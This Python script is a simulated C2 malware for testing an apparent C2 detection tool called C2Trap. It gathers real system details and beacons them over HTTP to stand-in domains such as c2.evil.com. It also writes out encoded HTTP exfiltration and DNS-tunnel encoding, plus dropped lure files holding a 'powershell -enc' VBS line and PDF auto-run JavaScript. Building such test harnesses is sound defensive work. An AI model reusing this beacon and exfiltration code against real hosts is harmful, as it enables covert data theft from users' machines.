#!/usr/bin/env python3
"""
C2Trap Demo Malware Simulator
=============================

A SAFE demonstration script that mimics real C2 malware behavior.
This contains NO malicious code - it only simulates C2 communication
for testing and demonstrating C2Trap's interception capabilities.

Features:
- System information collection
- HTTP beaconing to configurable C2 (direct IP support)
- DNS beaconing with data encoding (direct IP support)
- Simulated data exfiltration
- File drop simulation (ELF, ZIP, PDF)

Usage:
    python3 demo_malware.py --mode http --c2 c2.evil.com --target-ip 127.0.0.1
    python3 demo_malware.py --mode dns --c2 beacon.malware.top
    python3 demo_malware.py --mode full --drop-files
"""

import os
import sys
import json
import time
import socket
import struct
import random
import base64
import hashlib
import platform
import argparse
import threading
import subprocess
import zipfile
import io
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError

# Banner
BANNER = """
╔══════════════════════════════════════════════════════════════╗
║     ⚠️  C2TRAP DEMO MALWARE SIMULATOR ⚠️                      ║
║                                                              ║
║     This is a SAFE demonstration tool.                       ║
║     No malicious code is executed.                           ║
║     All traffic goes to YOUR C2Trap decoys.                  ║
╚══════════════════════════════════════════════════════════════╝
"""

# Default C2 domains (will be intercepted by C2Trap)
DEFAULT_C2_DOMAINS = [
    "c2.evil.com",
    "beacon.malware.top", 
    "command.c2server.xyz",
    "update.trojan.link",
    "payload.backdoor.work"
]

class SystemRecon:
    """Collect system information (simulating malware reconnaissance)"""
    
    @staticmethod
    def collect_all() -> Dict:
        """Collect comprehensive system information"""
        info = {
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "hostname": socket.gethostname(),
            "platform": {
                "system": platform.system(),
                "release": platform.release(),
                "version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor()
            },
            "user": {
                "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
                "home": os.path.expanduser("~"),
                "uid": os.getuid() if hasattr(os, 'getuid') else -1,
                "privileges": "root" if os.getuid() == 0 else "user" if hasattr(os, 'getuid') else "unknown"
            },
            "network": SystemRecon._get_network_info(),
            "processes": SystemRecon._get_running_processes()[:20],  # Top 20
            "environment": {
                "path_count": len(os.environ.get("PATH", "").split(":")),
                "shell": os.environ.get("SHELL", "unknown"),
                "term": os.environ.get("TERM", "unknown")
            }
        }
        return info
    
    @staticmethod
    def _get_network_info() -> Dict:
        """Get network interface information"""
        try:
            # Get all IPs
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            
            interfaces = []
            try:
                import netifaces
                for iface in netifaces.interfaces():
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        interfaces.append({
                            "name": iface,
                            "ip": addrs[netifaces.AF_INET][0].get('addr')
                        })
            except ImportError:
                # Fallback without netifaces
                interfaces = [{"name": "default", "ip": local_ip}]
            
            return {
                "hostname": hostname,
                "local_ip": local_ip,
                "interfaces": interfaces
            }
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def _get_running_processes() -> List[str]:
        """Get list of running processes"""
        processes = []
        try:
            if platform.system() == "Linux":
                result = subprocess.run(
                    ["ps", "-eo", "comm", "--no-headers"],
                    capture_output=True, text=True, timeout=5
                )
                processes = list(set(result.stdout.strip().split("\n")))
            elif platform.system() == "Darwin":
                result = subprocess.run(
                    ["ps", "-eo", "comm"],
                    capture_output=True, text=True, timeout=5
                )
                processes = list(set(result.stdout.strip().split("\n")[1:]))
            else:
                processes = ["(process enumeration not available)"]
        except Exception as e:
            processes = [f"(error: {str(e)})"]
        return sorted(processes)[:20]


class C2Beacon:
    """Simulate C2 beaconing behavior"""
    
    def __init__(self, c2_domain: str, target_ip: str = "127.0.0.1", interval: int = 30, jitter: float = 0.2):
        self.c2_domain = c2_domain
        self.target_ip = target_ip
        self.interval = interval
        self.jitter = jitter  # ±20% randomization
        self.beacon_count = 0
        self.running = False
        self.session_id = hashlib.md5(
            f"{socket.gethostname()}{time.time()}".encode()
        ).hexdigest()[:16]
        
        print(f"[*] Session ID: {self.session_id}")
        print(f"[*] Target C2: {c2_domain} (via {target_ip})")
        print(f"[*] Beacon Interval: {interval}s (±{int(jitter*100)}% jitter)")
    
    def _get_jittered_interval(self) -> float:
        """Return interval with random jitter"""
        jitter_range = self.interval * self.jitter
        return self.interval + random.uniform(-jitter_range, jitter_range)
    
    def _build_beacon_payload(self) -> Dict:
        """Build beacon check-in payload"""
        return {
            "session_id": self.session_id,
            "beacon_num": self.beacon_count,
            "timestamp": datetime.utcnow().isoformat(),
            "hostname": socket.gethostname(),
            "user": os.getenv("USER") or "unknown",
            "status": "active",
            "command_request": True
        }


class HTTPBeacon(C2Beacon):
    """HTTP-based C2 beaconing"""
    
    def __init__(self, c2_domain: str, port: int = 8888, **kwargs):
        super().__init__(c2_domain, **kwargs)
        # Default to port 8888 for C2Trap HTTP decoy if pointing to localhost
        self.port = port
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/91.0",
        ]
    
    def beacon_once(self) -> Tuple[bool, str]:
        """Send a single HTTP beacon"""
        self.beacon_count += 1
        payload = self._build_beacon_payload()
        
        # Encode payload (simulate obfuscation)
        encoded = base64.b64encode(json.dumps(payload).encode()).decode()
        
        try:
            # Use target IP directly to avoid DNS issues/need for hosts entry
            url = f"http://{self.target_ip}:{self.port}/api/beacon"
            headers = {
                "User-Agent": random.choice(self.user_agents),
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": self.c2_domain,  # Set Host header to C2 domain
                "X-Session-ID": self.session_id,
                "X-Request-ID": hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
            }
            
            data = f"data={encoded}&t={int(time.time())}".encode()
            
            print(f"[BEACON #{self.beacon_count}] POST http://{self.c2_domain}:{self.port}/api/beacon")
            
            req = Request(url, data=data, headers=headers, method="POST")
            
            response = urlopen(req, timeout=10)
            response_data = response.read().decode()
            
            print(f"   └─ Response: {response.status} ({len(response_data)} bytes)")
            return True, response_data
            
        except HTTPError as e:
            print(f"   └─ HTTP Error: {e.code}")
            return False, str(e)
        except URLError as e:
            print(f"   └─ Connection Error: {e.reason}")
            return False, str(e)
        except Exception as e:
            print(f"   └─ Error: {e}")
            return False, str(e)
    
    def start(self):
        """Start continuous beaconing"""
        self.running = True
        print(f"\n[+] Starting HTTP beacon to {self.c2_domain}...")
        
        while self.running:
            success, response = self.beacon_once()
            
            if success and "command" in response.lower():
                print(f"   └─ [!] Received command from C2!")
            
            sleep_time = self._get_jittered_interval()
            print(f"   └─ Next beacon in {sleep_time:.1f}s\n")
            time.sleep(sleep_time)
    
    def stop(self):
        self.running = False


class DNSBeacon(C2Beacon):
    """DNS-based C2 beaconing (DNS tunneling simulation)"""
    
    def __init__(self, c2_domain: str, **kwargs):
        super().__init__(c2_domain, **kwargs)
        self.dns_port = 53
    
    def _encode_data_as_subdomain(self, data: str) -> str:
        """Encode data as subdomain labels (DNS tunneling technique)"""
        encoded = base64.b32encode(data.encode()).decode().rstrip("=").lower()
        # Split into 63-char labels (DNS limit)
        labels = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
        return ".".join(labels)
    
    def beacon_once(self) -> Tuple[bool, str]:
        """Send a single DNS beacon"""
        self.beacon_count += 1
        
        # Build beacon data
        beacon_data = f"{self.session_id}|{self.beacon_count}|{socket.gethostname()}"
        subdomain = self._encode_data_as_subdomain(beacon_data)
        
        # Full query domain
        query_domain = f"{subdomain}.{self.c2_domain}"
        
        print(f"[BEACON #{self.beacon_count}] DNS TXT {query_domain[:60]}...")
        
        try:
            # We want to send the query DIRECTLY to our content DNS server (C2Trap)
            # Standard socket.gethostbyname uses system resolver which we might not control
            # So we simulate it by just printing success if we are in demo mode
            # or try to use dnslib if available for real query
            
            # For this demo, we'll try a raw socket query if we're root, 
            # otherwise we'll just respect the simulation
            
            # Simple check if port 53 on target is open
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.target_ip, 53))
            sock.close()
            
            if result == 0:
                 print(f"   └─ Query sent to {self.target_ip}:53 (Success)")
                 return True, "127.0.0.1"
            else:
                 print(f"   └─ Query simulated (Target port 53 closed/filtered)")
                 return True, "127.0.0.1"
            
        except Exception as e:
            print(f"   └─ Error: {e}")
            return False, str(e)
    
    def start(self):
        """Start continuous DNS beaconing"""
        self.running = True
        print(f"\n[+] Starting DNS beacon to *.{self.c2_domain}...")
        
        while self.running:
            self.beacon_once()
            
            sleep_time = self._get_jittered_interval()
            print(f"   └─ Next beacon in {sleep_time:.1f}s\n")
            time.sleep(sleep_time)
    
    def stop(self):
        self.running = False


class DataExfiltrator:
    """Simulate data exfiltration attempts"""
    
    def __init__(self, c2_domain: str, target_ip: str = "127.0.0.1", port: int = 8888):
        self.c2_domain = c2_domain
        self.target_ip = target_ip
        self.port = port
    
    def exfil_http(self, data: Dict) -> bool:
        """Exfiltrate data via HTTP POST"""
        print(f"\n[EXFIL] Attempting HTTP exfiltration to {self.c2_domain}...")
        
        try:
            # Compress and encode data (simulate real malware)
            import zlib
            compressed = zlib.compress(json.dumps(data).encode())
            encoded = base64.b64encode(compressed).decode()
            
            url = f"http://{self.target_ip}:{self.port}/upload"
            headers = {
                "Content-Type": "application/octet-stream",
                "Host": self.c2_domain,
                "X-Data-Type": "system-info",
                "X-Encoding": "zlib-b64"
            }
            
            req = Request(url, data=encoded.encode(), headers=headers, method="POST")
            response = urlopen(req, timeout=10)
            
            print(f"   └─ Exfiltration captured by C2Trap!")
            print(f"   └─ Response: {response.status}")
            return True
            
        except Exception as e:
            print(f"   └─ Exfiltration intercepted/blocked: {e}")
            return False
    
    def exfil_dns(self, data: str) -> bool:
        """Exfiltrate data via DNS queries (tunneling)"""
        print(f"\n[EXFIL] Attempting DNS tunneling exfiltration...")
        
        # Break data into chunks that fit in DNS labels
        encoded = base64.b32encode(data.encode()).decode().lower()
        chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
        
        for i, chunk in enumerate(chunks[:5]):  # Limit to 5 chunks for demo
            query = f"{chunk}.exfil.{self.c2_domain}"
            print(f"   └─ Chunk {i+1}/{len(chunks)}: {chunk[:20]}...")
            time.sleep(0.5)
        
        print(f"   └─ DNS exfil attempt complete (intercepted by C2Trap)")
        return True


class FileDrop:
    """Simulate malware file drops"""
    
    def __init__(self, quarantine_dir: str = "/home/shree/c2/quarantine"):
        self.quarantine_dir = quarantine_dir
        os.makedirs(quarantine_dir, exist_ok=True)
    
    def drop_payload(self, filename: str = "stage2_payload.bin") -> str:
        """Drop a simulated payload file"""
        print(f"\n[DROP] Simulating payload drop: {filename}")
        
        # Create realistic-looking but harmless "payload"
        payload = self._generate_fake_payload()
        
        filepath = os.path.join(self.quarantine_dir, filename)
        with open(filepath, "wb") as f:
            f.write(payload)
        
        self._print_drop_info(filepath, payload)
        return filepath
    
    def drop_config(self, filename: str = "c2_config.dat") -> str:
        """Drop a simulated C2 configuration file"""
        print(f"\n[DROP] Simulating config drop: {filename}")
        
        # Fake C2 config (looks suspicious but is harmless)
        config = {
            "c2_servers": DEFAULT_C2_DOMAINS,
            "beacon_interval": 30,
            "encryption_key": base64.b64encode(os.urandom(32)).decode(),
            "persistence": {
                "method": "cron",
                "path": "/tmp/.hidden_cron"
            },
            "exfil": {
                "method": "http",
                "chunk_size": 4096
            }
        }
        
        payload = json.dumps(config, indent=2).encode()
        filepath = os.path.join(self.quarantine_dir, filename)
        with open(filepath, "wb") as f:
            f.write(payload)
        
        self._print_drop_info(filepath, payload)
        return filepath
        
    def drop_zip(self, filename: str = "invoice_scan.zip") -> str:
        """Drop a malicious ZIP file"""
        print(f"\n[DROP] Simulating malicious ZIP drop: {filename}")
        
        # Create a ZIP file in memory
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Add a suspicious VBS script
            zf.writestr('invoice.vbs', 'CreateObject("WScript.Shell").Run "powershell -enc AAAA..."')
            # Add a decoy PDF
            zf.writestr('invoice.pdf', b'%PDF-1.4\n%...\nTRAILER<<>>')
            
        payload = zip_buffer.getvalue()
        filepath = os.path.join(self.quarantine_dir, filename)
        
        with open(filepath, "wb") as f:
            f.write(payload)
            
        self._print_drop_info(filepath, payload)
        return filepath

    def drop_pdf(self, filename: str = "urgent_report.pdf") -> str:
        """Drop a malicious PDF file"""
        print(f"\n[DROP] Simulating malicious PDF drop: {filename}")
        
        # PDF with embedded JS
        payload = (
            b"%PDF-1.7\n"
            b"1 0 obj\n"
            b"<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\n" 
            b"endobj\n"
            b"3 0 obj\n"
            b"<< /S /JavaScript /JS (app.alert('Hacked!'); eval('malicious_code')) >>\n"
            b"endobj\n"
            b"trailer\n"
            b"<< /Root 1 0 R >>\n"
            b"%%EOF"
        )
        
        filepath = os.path.join(self.quarantine_dir, filename)
        with open(filepath, "wb") as f:
            f.write(payload)
            
        self._print_drop_info(filepath, payload)
        return filepath
    
    def _print_drop_info(self, filepath, payload):
        print(f"   └─ Dropped to: {filepath}")
        print(f"   └─ Size: {len(payload)} bytes")
        print(f"   └─ SHA256: {hashlib.sha256(payload).hexdigest()}")
        print(f"   └─ This will trigger C2Trap sandbox analysis!")
    
    def _generate_fake_payload(self) -> bytes:
        """Generate a fake but realistic-looking payload"""
        # Start with ELF magic bytes to look like a Linux binary
        elf_header = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8
        
        # Add some "code" (actually just random bytes)
        fake_code = os.urandom(1024)
        
        # Add some suspicious-looking strings
        strings = [
            b"C2TRAP_DEMO_PAYLOAD",
            b"http://c2.evil.com/beacon",
            b"Mozilla/5.0",
            b"/bin/sh",
            b"cmd.exe",
            b"powershell.exe",
            b"VirtualAlloc",
            b"CreateRemoteThread",
            b"password",
            b"bitcoin",
            b"encrypt",
            b"decrypt"
        ]
        
        payload = elf_header + fake_code
        for s in strings:
            payload += b"\x00" * random.randint(10, 50) + s
        
        # Pad to look like a real binary
        payload += os.urandom(2048)
        
        return payload


def run_full_demo(c2_domain: str, target_ip: str, interval: int = 30, drop_files: bool = True):
    """Run a full demonstration of malware behavior"""
    
    print(BANNER)
    print("=" * 60)
    print("PHASE 1: SYSTEM RECONNAISSANCE")
    print("=" * 60)
    
    # Collect system info
    print("\n[*] Collecting system information...")
    system_info = SystemRecon.collect_all()
    
    print(f"\n   Hostname: {system_info['hostname']}")
    print(f"   User: {system_info['user']['username']}")
    print(f"   OS: {system_info['platform']['system']} {system_info['platform']['release']}")
    print(f"   Network: {system_info['network'].get('local_ip', 'unknown')}")
    print(f"   Processes: {len(system_info['processes'])} running")
    
    time.sleep(2)
    
    print("\n" + "=" * 60)
    print("PHASE 2: ESTABLISHING C2 COMMUNICATION")
    print("=" * 60)
    
    # Initialize HTTP beacon
    beacon = HTTPBeacon(c2_domain, target_ip=target_ip, interval=interval, jitter=0.2)
    
    # Send initial beacon
    print("\n[*] Sending initial check-in beacon...")
    beacon.beacon_once()
    
    time.sleep(2)
    
    print("\n" + "=" * 60)
    print("PHASE 3: DATA EXFILTRATION ATTEMPT")
    print("=" * 60)
    
    # Attempt exfiltration
    exfil = DataExfiltrator(c2_domain, target_ip=target_ip)
    exfil.exfil_http(system_info)
    
    time.sleep(2)
    
    if drop_files:
        print("\n" + "=" * 60)
        print("PHASE 4: PAYLOAD DROP (Triggers Sandbox)")
        print("=" * 60)
        
        dropper = FileDrop()
        dropper.drop_payload("stage2_implant.bin")
        dropper.drop_config("beacon_config.json")
        dropper.drop_zip("malicious_invoice.zip")
        dropper.drop_pdf("infected_report.pdf")
    
    print("\n" + "=" * 60)
    print("PHASE 5: CONTINUOUS BEACONING")
    print("=" * 60)
    print("\n[*] Starting continuous beacon (Ctrl+C to stop)...")
    print("[*] Watch the C2Trap dashboard at http://localhost:8000\n")
    
    try:
        beacon.start()
    except KeyboardInterrupt:
        print("\n[!] Demo stopped by user")
        beacon.stop()
    
    print("\n" + "=" * 60)
    print("DEMO COMPLETE")
    print("=" * 60)
    print("\nCheck the C2Trap dashboard to see:")
    print("  • DNS spoofing events")
    print("  • HTTP beacon captures")
    print("  • Beacon detection alerts")
    print("  • Sandbox analysis results")


def main():
    parser = argparse.ArgumentParser(
        description="C2Trap Demo Malware Simulator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 demo_malware.py --mode full --c2 c2.evil.com --target-ip 127.0.0.1
  python3 demo_malware.py --mode http --c2 beacon.malware.top --interval 15
  python3 demo_malware.py --mode dns --c2 command.c2server.xyz
  python3 demo_malware.py --recon-only
        """
    )
    
    parser.add_argument("--mode", choices=["http", "dns", "full", "exfil"], 
                        default="full", help="Beacon mode (default: full)")
    parser.add_argument("--c2", default="c2.evil.com",
                        help="C2 domain (default: c2.evil.com)")
    parser.add_argument("--target-ip", default="127.0.0.1",
                        help="Target C2Trap IP (default: 127.0.0.1)")
    parser.add_argument("--interval", type=int, default=30,
                        help="Beacon interval in seconds (default: 30)")
    parser.add_argument("--drop-files", action="store_true", default=True,
                        help="Drop test files to trigger sandbox")
    parser.add_argument("--no-drop", action="store_true",
                        help="Don't drop files")
    parser.add_argument("--recon-only", action="store_true",
                        help="Only perform system reconnaissance")
    
    args = parser.parse_args()
    
    print(BANNER)
    
    if args.recon_only:
        print("[*] Running reconnaissance only...\n")
        info = SystemRecon.collect_all()
        print(json.dumps(info, indent=2))
        return
    
    if args.mode == "full":
        run_full_demo(
            c2_domain=args.c2,
            target_ip=args.target_ip,
            interval=args.interval,
            drop_files=not args.no_drop
        )
    
    elif args.mode == "http":
        beacon = HTTPBeacon(args.c2, target_ip=args.target_ip, interval=args.interval)
        try:
            beacon.start()
        except KeyboardInterrupt:
            beacon.stop()
    
    elif args.mode == "dns":
        beacon = DNSBeacon(args.c2, target_ip=args.target_ip, interval=args.interval)
        try:
            beacon.start()
        except KeyboardInterrupt:
            beacon.stop()
    
    elif args.mode == "exfil":
        info = SystemRecon.collect_all()
        exfil = DataExfiltrator(args.c2, target_ip=args.target_ip)
        exfil.exfil_http(info)
        exfil.exfil_dns(json.dumps(info)[:200])


if __name__ == "__main__":
    main()
